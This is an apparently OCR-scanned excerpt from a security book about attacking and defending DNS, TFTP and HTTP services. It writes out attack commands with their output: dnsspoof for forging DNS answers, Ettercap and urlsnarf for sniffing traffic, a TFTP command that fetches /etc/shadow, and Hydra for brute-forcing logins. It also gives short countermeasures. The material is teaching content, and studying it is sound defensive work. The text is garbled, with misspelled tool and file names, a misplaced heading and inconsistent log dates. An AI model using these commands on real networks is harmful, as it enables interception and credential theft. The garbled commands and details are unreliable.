
# DNS (Domain Name System): 53 (TCP and UDP)

DNS is a protocol used to translate between domain names and IP addresses.

Spoofing: Unlike TCP, UDP is not a connection-oriented protocol. This makes it easy to spoof UDP traffic. When a DNS queries a DNS server, the DNS server responds to the query by sending a UDP packet originating from port 53. However, a malicious user located on the same network segment or within the path to the DNS server could send a response back to the client with the source IP address of the DNS server. If the malicious user's response is received by the client before the authentic DNS server, the malicious response will be accepted. Since the malicious user could craft a spoofed DNS response back to the client, he or may trick the client connecting into it or her host instead of the intended target.

# Spoof DNS Responses

The dnsspoof program, distributed among Dsniff, is a tool that facilitates the forging of DNS queries. For example, suppose an attacker has gained control of a network's gateway with IP address 10.0.0.1. Let us assume that the real IP address of somecompanyexample.com is 10.1.1.2. The attacker can run dnsspoof and cause it to respond to all DNS queries for somecompanyexample.com with 192.168.1.1, the IP address of his or her machine.

```
[gateway]# dnsspoof -i eth0 -f /etc/dnsniff.txt
kernel filter, protocol ALL, raw packet socket
dnsspoof: listening on eth1 [udp dst port 53 and not src 10.0.0.1]
```

The attacker would need to make sure the contents of /etc/dnsniff.txt contain the following:

192.168.1.1 somecompanyexample.com

Now, in an attempt to identify the intruder, if the victim would perform a DNS query for somecompanyexample.com, he or she is pointed to the IP address of the hacker's machine at 192.168.1.1 (instead of 10.1.1.2):

```
[bash]$ host somecompanyexample.com
somecompanyexample.com has address 192.168.1.1
```

# DNSSEC

Considering DNSSEC (DNS Security), an extension to DNS that provides for end-to-end authenticity. See http://www.dnssec.net/ for more information about DNSSEC.

# Software Vulnerabilities

BIND (Berkeley Internet Name Domain) is the most widely used DNS server on the Internet. The next paragraph documents a well-known BIND vulnerability.

- BIND NXT Overflow and DOS Vulnerabilities: This vulnerability was caused by BIND's failure in processing input validation of NXT records. It is possible to remotely exploit this by forcing a vulnerable DNS server to fetch a meticulously crafted NXT record. Other DOS (Denial Of Service) vulnerabilities were also announced in the BIND advisory located at http://online.securityfocus.com/bid/788.

Consider using djbdns as a replacement for BIND. The djbdns program is available at http://cr.yp.to/djbdns.html.

# TFTP (Trivial File Transfer Protocol): 69 (UDP)

TFTP is a UDP-based protocol used to transfer files. It lacks most features as authentication and directory listing. TFTP only supports reading and writing files from and to a remote server.

Sniffing: Since TFTP is a clear-text protocol, it is possible to sniff the data being transferred.

# Sniff TFTP Data

Suppose a user is TFTPing the /etc/passwd file from a remote host. A malicious user on the same segment as the user can sniff the victim's data by running Ettercap configured to display UDP traffic:

```
[shell]# aftercap -N -m -t udp

ettercap 0.6.7 (c) 2002 ALoR & NaGa

Your IP: 192.168.1.1 with MAC: 00:01:1E:34:AB:36 on Iface: eth0

Loading plugins... Done.

Resolving 1 hostnames...

* |=======================================| 100.00 %

Press 'h' for help...

Sniffing (MAC based): ANY --> ANY

UDP packets only...
```

# 76 Part I: Hacking Techniques and Defenses

```
22:49:55 192.168.1.1:33569 --> 10.0.0.1:69 proto: U ./etc/passwd.
```

```
22:23:54 10.0.0.1:2563 --> 192.168.1.1:33569 proto: U ...root:x:0:0:/bin/bash
bin:x:1:1:/
daemon:x:2:2:/sbin/
mad:x:3:4:/var/adm/
lp:x:4:7:/var/spool/lpd.
sync:x:5:0:/bin/
shutdown:x:6:0:/sbin/
halt:x:7:0:/sbin/halt
mail:x:8:12:/var/spool/
news:x:9:13:/var/spool/
nuucp:x:10:14:/var/spool/uucp.
operator:x:11:0:/root/
games:x:12:100:/usr/games/
gopher:x:13:30:/usr/lib/gopher-data/
ftp:x:14:50:/home/ftp/.
```

# Use Secure Protocols

Do not use clear text as TFTP. Consider using HTTPS or SSH to perform secure transfers.

# TFTP Misconfigurations

TFTP servers are often misconfigured to serve within the (root) directory. Such a configuration may allow a remote user to fetch a file as /etc/passwd.

# Obtain Critical Files

If a remote TFTP server is misconfigured to serve within the (root) directory, the following TFTP commands can be used to obtain files as /etc/shadow:

```
[bash]$ tftp 10.0.0.1 get /etc/shadow
```

# Set TFTP Root Directory

Most TFTP servers are configured by default to serve only files within /tftp. This directory can be set or changed using the -s switch. See tftpd for details.

# HTTP (Hypertext Transfer Protocol): 80 (TCP)

HTTP is a stateless protocol used to distribute WWW (Wide Web) content. It is impossible to manually check for all possible misconfigurations. Automated tools such as Nikto, available from http://www.cirt.net/code/nikto.shtml, do a good job of server assessment and should be used to check for misconfigurations.

# Brute-Forcing

It is possible to brute-force authentication using tools such as Hydra. Hydra is a brute-forcing tool that supports HTTP and can be used to brute-force protected resources. Here is an example of how Hydra may be used to brute-force authentication:

```
hydra -L usernames.txt -P passwords.txt www.somecompanyexample.com
```

# Prevent Brute-Force Attacks

Sniffing: Since HTTP is a clear-text protocol, it is possible for a malicious user on a network segment to watch another user's HTTP traffic. URLs: The urlsnarp program, distributed along with Dsniff, can be used to sniff HTTP requests sent by users over the network:

```
# urlsnarp
Kernel filter, protocol ALL, raw packet socket
urlsnarp is listening on [tcp port 80 or 8080 or 3128]
GET http://www.mozilla.org/start/HTTP/1.1 - "Mozilla/5.0 (X11); Linux; i686; en-US; rv:1.3a) Gecko/20021212
10.0.0.1 - [Feb/2023:21:50:16-0800] GET http://c.cirt.net/HTTP/1.1 - "Mozilla/5.0 (X11); Linux; i686; en-US; rv:1.3a) Gecko/20021212
10.0.0.1 - [Feb/2023:21:50:42-0800] GET http://c.cirt.net/images/bg.gif HTTP/1.1 - "Mozilla/5.0 (X11); Linux; i686; en-US; rv:1.3a) Gecko/20021212
10.0.0.1 - [Feb/2023:21:50:42-0800] GET http://c.cirt.net/images/cirt_headline.gif HTTP/1.1 - "http://cirt.net/" "Mozilla/5.0 (X11; Linux; i686; en-US; rv:1.3a) Gecko/200201212
10.0.0.1 - [Feb/2003:21:50:42-0800] GET http://c.cirt.net/images/pix.gif HTTP/1.1 - "http://cirt.net/" "Mozilla/5.0 (X11; Linux; i686; en-US; rv:1.3a) Gecko/200201212
```

The webspy program, also distributed along with Dsniffer, is another great HTTP sniffing tool. As soon as it detects an HTTP request on the network, it sends it to a running Netscape process. This enables a malicious user on the network to watch the victim's HTTP session in real time.

# Sniff HTTP Data

Ettercap can be used to sniff HTTP traffic being seen over the network:

```
[bash]# ettercap -t tcp -N -s ANY:80
```

```
ettercap 0.6.7 (c) 2002 ALoR & NaGa

Your IP: 10.0.0.1 with MAC: 00:01:01:13:A4:B2 on Iface: eth0

Loading plugins... Done.

Resolving 1 hostnames...

* ========================================| 100.00 %
```

Press 'h' for help...

```
Sniffing (IP based): ANY:80 <--> ANY:0

TCP packets only...

22:15:33 10.0.0.1:37725 --> 192.168.1.180 proto: T

GET / HTTP/1.0.
Host: mozilla.org.
Accept: text/html,text/plain,application/vnd.sun.xml.writer,
application/vnd.sun.xml.writer.global,application/
vnd.stardivision.writer,application/vnd.stardivision.writer-global,
application/x-starwriter,application/vnd.sun.xml.writer.template.
Accept: application/vnd.sun.xml.calc,application/
vnd.stardivision.calc,application/x-starcalc,application/
vnd.sun.xml.calc.template,application/vnd.sun.xml.impress,
application/vnd.stardivision.impress,application/
vnd.stardivision.impress-packed.
Accept: application/x-starimpress,application/
```
